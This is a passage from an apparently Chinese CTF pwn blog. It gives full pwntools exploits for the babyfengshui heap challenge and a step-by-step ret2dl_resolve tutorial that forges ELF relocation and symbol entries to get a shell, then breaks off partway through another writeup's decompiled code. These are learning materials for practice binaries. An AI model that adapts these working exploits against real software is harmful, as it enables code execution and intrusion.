class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>这里需要特别注意add函数，它有两个长度输入，一个是description的堆块大小，一个是description内容的长度大小。这个name其实没必要弄，因为利用不到，但是我还是弄了。</p><p>首先添加两个0x80大小description的堆块，这样得到了两个0x80和0x88的大堆块。free掉第一个堆块，因为都不属于fastbin范围的堆块，那么就会合并成0x108大小的堆块，那么接下来如果我再申请一个0x100大小的description就会得到这个free的堆块，那么就可以在这个堆块上溢出第二个堆块了。</p><p>下面是我的完整exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">elf,p=conn(<span class="number">0</span>,<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#add(b&#x27;a&#x27;,0x80,0x80,b&#x27;a&#x27;*0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\0&#x27;</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10c</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x89</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0x81</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&#x27;free_addr&#x27;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr=free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl_resolve</title>
      <link href="/2021/07/19/ret2dl_resolve/"/>
      <url>/2021/07/19/ret2dl_resolve/</url>
      
        <content type="html"><![CDATA[<p>有这么一个漏洞，他能在程序不提供任何输出函数的情况下执行<code>system(&quot;/bin/sh&quot;)</code>，没错，他就是<code>ret2dl_resolve</code>，这个我也认为是栈溢出的最后一关了，因此我现在就算是栈溢出毕业了吧hhhh。</p><span id="more"></span><p><code>elf</code>文件我们自给自足，自己编译，为了一步一步演示，还是给了一个输出函数，但是我们不通过这个输出函数去泄露<code>libc</code>的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to the last stackoverflow&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$gcc -g ret2dlresolve.c -o bof -no-pie -fno-<span class="built_in">stack</span>-protector -z relro -m32</span><br></pre></td></tr></table></figure><p>我们编译32位的只开NX保护程序测试。</p><h2 id="dl-runtime-resolve函数"><a href="#dl-runtime-resolve函数" class="headerlink" title="_dl_runtime_resolve函数"></a>_dl_runtime_resolve函数</h2><p><code>_dl_runtime_resolve</code>的原型是<code>_dl_runtime_resolve(link_map,reloc_offset)</code>参数<code>link_map</code>的参数传入在<code>reloc_offset</code>之后（根据32位函数调用约定），在动态链接中，所有函数的延迟绑定都需要用这个函数去寻址。寻址的时候eip会在<code>plt[0]</code>然后<code>push got[1],jmp got[2]</code>，<code>got[1]</code>就是<code>link_map</code>，<code>got[2]</code>就是<code>dl_runtime_resolve</code>函数了。</p><p>再次解释一遍第一次调用函数的流程。调用肯定是从plt表的对应位置调用的，plt表都会指向got表一个地址，got表在没有被写入函数地址时会<code>push</code>一个<code>reloc_arg</code>,然后<code>jmp plt[0]</code>，<code>plt</code>[0]有一段指令就是压<code>got[1]</code>做参数，然后<code>jmp dl_runtime_resolve</code>。然后拆开这个函数会发现它内部调用了<code>_dl_fixup</code>函数，这个函数就是用来找地址和回写<code>got</code>表的。</p><h2 id="控制reloc-offset参数"><a href="#控制reloc-offset参数" class="headerlink" title="控制reloc_offset参数"></a>控制reloc_offset参数</h2><p>对于这个程序，我们先把栈迁移到<code>.bss</code>段上，然后在这个段上精心构造<code>payload</code>就可，首先我们直接调用<code>plt[0]</code>，自己传<code>reloc_offset</code>参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">proc=<span class="string">&#x27;./bof&#x27;</span></span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x804c024</span><span class="comment">#readelf -S bof查看所有的段的地址</span></span><br><span class="line">ppp_ret=<span class="number">0x08049331</span><span class="comment">#ROPgadget</span></span><br><span class="line">leave_ret=<span class="number">0x08049145</span></span><br><span class="line">pop_ebp=<span class="number">0x08049333</span></span><br><span class="line">stack_size=<span class="number">0x400</span></span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=<span class="number">0x6c</span>+<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,p32(read)+p32(ppp_ret)<span class="comment">#弹出三个参数</span></span><br><span class="line">,p32(<span class="number">0</span>)+p32(stack_start)</span><br><span class="line">,p32(<span class="number">100</span>)</span><br><span class="line">,p32(pop_ebp)<span class="comment">#栈迁移</span></span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome to the last stackoverflow&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=<span class="number">0x10</span></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/8Y72K69DTlsZ1PL.png" alt="ret2dl_resolve_1.png"></p><p>可以看到我在没有直接调用puts的情况下输出了<code>/bin/sh</code>字符串。</p><p>但是可以看到，这里的第二个参数是我自己传的，为什么是<code>0x10</code>呢，<code>0x10</code>是<code>puts</code>函数的重定位项在<code>.rel.plt</code>段的偏移。重定位项是这么一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">// 其实就是got表的地址</span></span><br><span class="line">    Elf32_Word r_info; <span class="comment">// 符号表索引，高三个字节指示了puts函数在.dynsym段上的偏移/16。</span></span><br><span class="line">    <span class="comment">//因此得出的偏移必须被16整除。</span></span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>由于我们有puts函数，所以<code>.rel.plt</code>段上有现成的结构体，我们现在主要来伪造<code>.rel.plt</code>重定位项的结构体。</p><h2 id="伪造重定位项"><a href="#伪造重定位项" class="headerlink" title="伪造重定位项"></a>伪造重定位项</h2><p>我们只需要改第二个<code>payload</code>即可。</p><p>我们在栈上伪造的重定位项的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_rel-.rel.plt_addr=reloc_offset</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(<span class="number">0x307</span>))</span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://i.loli.net/2021/07/19/3sXOio6cLwCQ2HN.png" alt="ret2dl_resolve_2.png"></p><h2 id="伪造符号"><a href="#伪造符号" class="headerlink" title="伪造符号"></a>伪造符号</h2><p>既然<code>r_info</code>我们可以控制，自然我们也能把它的偏移改到我们可以控制的地址当中，然后在那里伪造一个符号结构体。</p><p>我们来看看符号<code>ELF32_Sym</code>的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value; <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_word st_size; <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">// symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">// Section index</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>然后构造出<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">rel_plt=<span class="number">0x8048388</span></span><br><span class="line">dynsym=<span class="number">0x8048248</span></span><br><span class="line">str_tab=<span class="number">0x80482D8</span></span><br><span class="line">cmd=<span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-(stack_start+<span class="number">28</span>-dynsym)%<span class="number">0x10</span></span><br><span class="line">fake_sym_addr=stack_start+<span class="number">28</span>+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+<span class="number">20</span>-rel_plt</span><br><span class="line">fake_sym=flat(p32(<span class="number">0x1a</span>),p32(<span class="number">0</span>)*<span class="number">2</span>,p32(<span class="number">0x12</span>))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span><span class="comment">#这个给leave指令后的pop ebp，实际从下面开始执行</span></span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line">,<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">,p32(stack_start+<span class="number">92</span>)</span><br><span class="line">,fake_puts</span><br><span class="line">,align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">,fake_sym</span><br><span class="line">)</span><br><span class="line">payload=payload.ljust(<span class="number">92</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=cmd </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h2 id="伪造字符串"><a href="#伪造字符串" class="headerlink" title="伪造字符串"></a>伪造字符串</h2><p>最后一步就是在某个地方写上<code>puts</code>然后修改<code>st_name</code>到那个<code>puts</code>就可，然后把<code>puts</code>替换成<code>system</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">proc=&#x27;./bof&#x27;</span><br><span class="line">elf=ELF(proc)</span><br><span class="line">p=process(proc)</span><br><span class="line">elf=ELF(proc)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">read=elf.plt[&#x27;read&#x27;]</span><br><span class="line">bss=0x804c024#readelf -S bof查看所有的段的地址</span><br><span class="line">ppp_ret=0x08049331#ROPgadget</span><br><span class="line">leave_ret=0x08049145</span><br><span class="line">pop_ebp=0x08049333</span><br><span class="line">stack_size=0x800</span><br><span class="line">stack_start=bss+stack_size</span><br><span class="line">buf_size=0x6c+4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> buf_size*b&#x27;a&#x27;</span><br><span class="line">,p32(read)+p32(ppp_ret)#弹出三个参数</span><br><span class="line">,p32(0)+p32(stack_start)</span><br><span class="line">,p32(100)</span><br><span class="line">,p32(pop_ebp)#栈迁移</span><br><span class="line">,p32(stack_start)</span><br><span class="line">,p32(leave_ret)</span><br><span class="line">)</span><br><span class="line">p.sendlineafter(b&#x27;Welcome to the last stackoverflow&#x27;,payload)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">plt_0=0x8049030</span><br><span class="line">rel_plt=0x8048388</span><br><span class="line">dynsym=0x8048248</span><br><span class="line">str_tab=0x80482D8</span><br><span class="line">cmd=b&#x27;/bin/sh\0&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">align=0x10-(stack_start+28-dynsym)%0x10</span><br><span class="line">fake_sym_addr=stack_start+28+align</span><br><span class="line">r_info=(((fake_sym_addr-dynsym)//16)&lt;&lt;8)|0x7</span><br><span class="line">fake_puts=flat(p32(puts_got),p32(r_info))</span><br><span class="line"></span><br><span class="line">str_addr=fake_sym_addr+0x10</span><br><span class="line">st_name=str_addr-str_tab</span><br><span class="line"></span><br><span class="line">reloc_arg=stack_start+20-rel_plt</span><br><span class="line">fake_sym=flat(p32(st_name),p32(0)*2,p32(0x12))</span><br><span class="line"></span><br><span class="line">payload=flat(</span><br><span class="line"> b&#x27;a&#x27;*4#这个给leave指令后的pop ebp，实际从下面开始执行</span><br><span class="line">,p32(plt_0)</span><br><span class="line">,p32(reloc_arg)</span><br><span class="line"></span><br><span class="line">,p32(stack_start+92)*2</span><br><span class="line">,fake_puts</span><br><span class="line">,align*b&#x27;a&#x27;</span><br><span class="line">,fake_sym</span><br><span class="line">,b&#x27;system\0&#x27;</span><br><span class="line">)</span><br><span class="line">print(st_name)</span><br><span class="line">payload=payload.ljust(92,b&#x27;a&#x27;)</span><br><span class="line">payload+=cmd </span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/19/NBuOMalU5tvi9JL.png" alt="ret2dl_resolve_3.png"></p><p>完结撒花，开始学堆。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浙江2020省赛pwn1</title>
      <link href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/"/>
      <url>/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/</url>
      
        <content type="html"><![CDATA[<p>据学长说，那一次的ctf出题人一句“我就没打算让pwn有解”让全场所有pwner直呼内行，pwn1看似简单实则在比赛过程中能出比赛也快结束了。</p><span id="more"></span><h2 id="分析elf确定大概思路"><a href="#分析elf确定大概思路" class="headerlink" title="分析elf确定大概思路"></a>分析elf确定大概思路</h2><p>IDA打开分析elf文件</p><p><code>main()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int16 *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span 